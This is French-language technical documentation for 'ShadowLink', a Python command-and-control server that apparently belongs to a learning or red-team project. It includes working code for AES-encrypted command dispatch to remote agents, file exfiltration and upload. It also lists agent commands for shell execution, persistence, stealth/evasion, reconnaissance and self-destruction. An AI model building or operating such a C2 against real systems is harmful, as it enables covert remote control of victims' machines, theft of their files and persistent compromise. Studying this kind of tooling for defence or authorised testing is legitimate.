# 🖧 ShadowLink Server - Documentation Technique

## Vue d'ensemble

Le serveur ShadowLink est un serveur C2 (Command & Control) multi-agent écrit en Python qui permet de contrôler plusieurs agents simultanément.

---

## 📋 Caractéristiques Techniques

| Propriété | Valeur |
|-----------|--------|
| Langage | Python 3.8+ |
| Protocole | TCP |
| Port par défaut | 4444 |
| Chiffrement | AES-256-CBC |
| Multi-threading | Oui (accept + command loop) |
| Multi-agent | Oui |

---

## 🏗️ Architecture du Code

```
server.py
├── Configuration
│   ├── AES_KEY
│   ├── HOST / PORT
│   └── RECV_BUFFER / FILE_CHUNK_SIZE
│
├── Chiffrement
│   ├── aes_encrypt()
│   └── aes_decrypt()
│
├── Gestion des Agents
│   ├── agents = {}  # Dictionnaire thread-safe
│   ├── generate_agent_id()
│   ├── add_agent()
│   ├── remove_agent()
│   └── list_agents()
│
├── File Transfer
│   ├── download_file_from_agent()
│   └── upload_file_to_agent()
│
├── Gestion des Fichiers
│   └── save_recon_report()
│
├── Threading
│   └── accept_connections() [Thread daemon]
│
├── Communication
│   └── send_command_to_agent()
│
├── Interface
│   └── print_help()
│
└── Main Loop
    ├── Server socket setup
    ├── Accept thread
    └── Command prompt loop
```

---

## 🔧 Configuration

### Variables principales

```python
# Clé AES partagée (doit correspondre à l'agent)
AES_KEY = b'ShadowLinkAES256SecretKey32Bytes'

# Interface d'écoute
HOST = "127.0.0.1"
PORT = 4444

# Tailles de buffer
RECV_BUFFER = 65535
FILE_CHUNK_SIZE = 4096
```

### Dépendances

```
pycryptodome>=3.9.0
```

Installation:
```bash
pip install pycryptodome
```

---

## 🔐 Chiffrement

### Encryption

```python
def aes_encrypt(data: bytes) -> bytes:
    """Chiffre les données avec AES-256-CBC"""
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return iv + encrypted
```

### Decryption

```python
def aes_decrypt(data: bytes) -> bytes:
    """Déchiffre les données avec AES-256-CBC"""
    iv = data[:16]
    encrypted = data[16:]
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
    return decrypted
```

---

## 👥 Gestion Multi-Agent

### Structure de données

```python
agents = {
    1: {
        "socket": <socket object>,
        "ip": "192.168.1.100",
        "port": 54321,
        "connected_at": datetime(2024, 1, 15, 10, 30, 0)
    },
    2: {
        "socket": <socket object>,
        "ip": "192.168.1.101",
        "port": 54322,
        "connected_at": datetime(2024, 1, 15, 10, 35, 0)
    }
}

agents_lock = threading.Lock()  # Thread-safe access
current_agent_id = None         # Agent actuellement sélectionné
```

### Thread d'acceptation

```python
def accept_connections(server_socket):
    """Thread qui accepte les nouvelles connexions"""
    while True:
        try:
            client_socket, address = server_socket.accept()
            agent_id = add_agent(client_socket, address)
            print(f"\n[+] Nouvel agent: ID={agent_id}, IP={address[0]}:{address[1]}")
        except OSError:
            break
```

---

## 📡 Communication avec les Agents

### Envoi de commande

```python
def send_command_to_agent(agent_id, command):
    """Envoie une commande et retourne la réponse"""
    with agents_lock:
        if agent_id not in agents:
            return None, "Agent non trouvé"
        agent_socket = agents[agent_id]["socket"]
    
    try:
        # Envoyer la commande chiffrée
        encrypted_cmd = aes_encrypt(command.encode("utf-8"))
        agent_socket.send(encrypted_cmd)
        
        # Recevoir la réponse
        agent_socket.settimeout(120)
        response = agent_socket.recv(RECV_BUFFER)
        agent_socket.settimeout(None)
        
        if not response:
            return None, "Agent déconnecté"
        
        decrypted = aes_decrypt(response)
        return decrypted, None
        
    except socket.timeout:
        return None, "Timeout - pas de réponse"
    except Exception as e:
        return None, f"Erreur: {e}"
```

---

## 📂 File Transfer

### Download (Agent → Server)

```python
def download_file_from_agent(agent_socket, remote_path: str) -> tuple:
    """Télécharge un fichier depuis l'agent"""
    
    # 1. Envoyer la commande download
    cmd = f"download {remote_path}"
    encrypted_cmd = aes_encrypt(cmd.encode("utf-8"))
    agent_socket.send(encrypted_cmd)
    
    # 2. Recevoir les métadonnées (OK:<size>)
    meta_response = agent_socket.recv(RECV_BUFFER)
    decrypted_meta = aes_decrypt(meta_response).decode("utf-8")
    
    if decrypted_meta.startswith("ERROR:"):
        return False, decrypted_meta[6:]
    
    file_size = int(decrypted_meta[3:])  # "OK:<size>"
    
    # 3. Envoyer ACK
    agent_socket.send(aes_encrypt(b"ACK"))
    
    # 4. Recevoir les chunks
    local_path = os.path.join("downloads", f"{timestamp}_{filename}")
    with open(local_path, "wb") as f:
        while True:
            chunk_size_data = agent_socket.recv(4)
            chunk_size = struct.unpack("<I", chunk_size_data)[0]
            
            if chunk_size == 0:
                break  # Fin
            
            encrypted_chunk = recv_all(agent_socket, chunk_size)
            decrypted_chunk = aes_decrypt(encrypted_chunk)
            f.write(decrypted_chunk)
    
    return True, local_path
```

### Upload (Server → Agent)

```python
def upload_file_to_agent(agent_socket, local_path: str, remote_path: str) -> tuple:
    """Envoie un fichier vers l'agent"""
    
    if not os.path.exists(local_path):
        return False, "Fichier local introuvable"
    
    file_size = os.path.getsize(local_path)
    
    # 1. Envoyer la commande upload
    cmd = f"upload {remote_path}"
    agent_socket.send(aes_encrypt(cmd.encode("utf-8")))
    
    # 2. Envoyer les métadonnées
    meta = f"SIZE:{file_size}"
    agent_socket.send(aes_encrypt(meta.encode("utf-8")))
    
    # 3. Attendre READY
    ready_response = agent_socket.recv(RECV_BUFFER)
    decrypted_ready = aes_decrypt(ready_response).decode("utf-8")
    
    if decrypted_ready != "READY":
        return False, decrypted_ready
    
    # 4. Envoyer les chunks
    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(FILE_CHUNK_SIZE - 32)
            if not chunk:
                break
            
            encrypted_chunk = aes_encrypt(chunk)
            agent_socket.send(struct.pack("<I", len(encrypted_chunk)))
            agent_socket.send(encrypted_chunk)
    
    # 5. Marqueur de fin
    agent_socket.send(struct.pack("<I", 0))
    
    return True, "Fichier envoyé"
```

---

## 📝 Commandes Serveur

### Gestion des agents

| Commande | Description |
|----------|-------------|
| `agents` / `list` / `ls` | Liste tous les agents connectés |
| `select <id>` | Sélectionne un agent pour les commandes |
| `deselect` | Désélectionne l'agent actuel |
| `kill <id>` | Envoie `die` à un agent et le supprime |
| `killall` | Tue tous les agents |

### Commandes agent (requiert sélection)

| Commande | Description |
|----------|-------------|
| `ps` | Liste les processus |
| `kill <pid>` | Tue un processus (côté agent) |
| `download <path>` | Télécharge un fichier |
| `upload <src> <dst>` | Envoie un fichier |
| `recon` | Reconnaissance système |
| `persist` | Installe la persistence |
| `unpersist` | Supprime la persistence |
| `checkpersist` | Vérifie la persistence |
| `stealth on/off` | Active/désactive l'évasion |
| `checksec` | Vérifications de sécurité |
| `selfdestruct` | Supprime l'agent du disque |
| `exit` | Déconnecte (agent se reconnecte) |
| `die` | Termine l'agent définitivement |
| `<cmd>` | Exécute une commande shell |

### Commandes serveur

| Commande | Description |
|----------|-------------|
| `help` / `?` | Affiche l'aide |
| `quit` / `q` | Ferme le serveur |

---

## 💾 Fichiers Générés

### Structure

```
ShadowLink/
├── downloads/              # Fichiers téléchargés
│   └── 20241115_103000_hosts
├── reports/                # Rapports de recon
│   └── recon_192.168.1.100_20241115_103500.txt
```

### Nommage

- **Downloads**: `<timestamp>_<filename>`
- **Reports**: `recon_<ip>_<timestamp>.txt`

---

## 🔄 Flux d'Exécution

```
main()
│
├─► socket.socket(AF_INET, SOCK_STREAM)
├─► setsockopt(SO_REUSEADDR)
├─► bind((HOST, PORT))
├─► listen(5)
│
├─► Thread: accept_connections()
│   └─► while True:
│       ├─► accept()
│       └─► add_agent()
│
└─► while True: [Command Loop]
    │
    ├─► Construire prompt
    │   ├─► "Shell> " (pas d'agent)
    │   └─► "[Agent-X@IP]> " (agent sélectionné)
    │
    ├─► input(prompt)
    │
    ├─► [Commande serveur?]
    │   ├─► help → print_help()
    │   ├─► quit → break
    │   ├─► agents → list_agents()
    │   ├─► select <id> → current_agent_id = id
    │   └─► kill <id> → send "die" + remove_agent()
    │
    ├─► [Agent sélectionné?]
    │   └─► No → "Aucun agent sélectionné"
    │
    └─► [Commande agent]
        ├─► [download?] → download_file_from_agent()
        ├─► [upload?] → upload_file_to_agent()
        └─► [other?] → send_command_to_agent()
            │
            ├─► [recon?] → save_recon_report()
            └─► print(response)
```

---

## 🖥️ Interface Utilisateur

### Prompt

```
# Sans agent sélectionné
Shell> 

# Avec agent sélectionné
[Agent-1@192.168.1.100]> 
```

### Affichage des agents

```
╔════════════════════════════════════════════════════════════╗
║                    AGENTS CONNECTÉS                          ║
╠════╦═══════════════════╦═══════╦═════════════════════════════╣
║ ID ║        IP         ║ Port  ║      Connecté depuis        ║
╠════╬═══════════════════╬═══════╬═════════════════════════════╣
║ *1 ║ 192.168.1.100     ║ 54321 ║ 2024-01-15 10:30:00         ║
║  2 ║ 192.168.1.101     ║ 54322 ║ 2024-01-15 10:35:00         ║
╚════╩═══════════════════╩═══════╩═════════════════════════════╝
  * = agent sélectionné
```

---

## ⚠️ Gestion des Erreurs

### Déconnexion d'agent

```python
response, error = send_command_to_agent(current_agent_id, command)

if error:
    print(f"[-] {error}")
    if "déconnecté" in error.lower() or "Erreur" in error:
        remove_agent(current_agent_id)
        current_agent_id = None
```

### Timeout

```python
agent_socket.settimeout(120)  # 2 minutes pour les commandes longues
# ... recv() ...
agent_socket.settimeout(None)  # Reset
```

---

## 🔒 Sécurité

### Thread Safety

```python
agents_lock = threading.Lock()

# Toujours utiliser le lock pour accéder à agents
with agents_lock:
    if agent_id in agents:
        socket = agents[agent_id]["socket"]
```

### Fermeture propre

```python
try:
    # Main loop
    while True:
        ...
except KeyboardInterrupt:
    print("\n[*] Interruption...")
finally:
    # Fermer tous les sockets agents
    with agents_lock:
        for aid in list(agents.keys()):
            try:
                agents[aid]["socket"].close()
            except:
                pass
    
    # Fermer le socket serveur
    server.close()
```

---

## 🚀 Démarrage

### Lancement

```bash
cd server
python server.py
```

### Sortie attendue

```
╔══════════════════════════════════════════════════════════╗
║           SHADOWLINK C2 SERVER - Phase 7                 ║
║         File Transfer + Process Management               ║
╚══════════════════════════════════════════════════════════╝

[*] Serveur en écoute sur 127.0.0.1:4444
[*] En attente d'agents...

Shell> 
```

---

## ⚠️ Limitations Connues

1. **Pas d'authentification** - Tout client peut se connecter
2. **Pas de TLS** - Trafic chiffré AES mais pas de vérification d'identité
3. **Single-threaded commands** - Une commande à la fois par agent
4. **Pas de persistance serveur** - Les agents sont perdus au redémarrage
5. **Pas de logging** - Pas d'historique des commandes
6. **Pas de rate limiting** - Vulnérable au spam de connexions
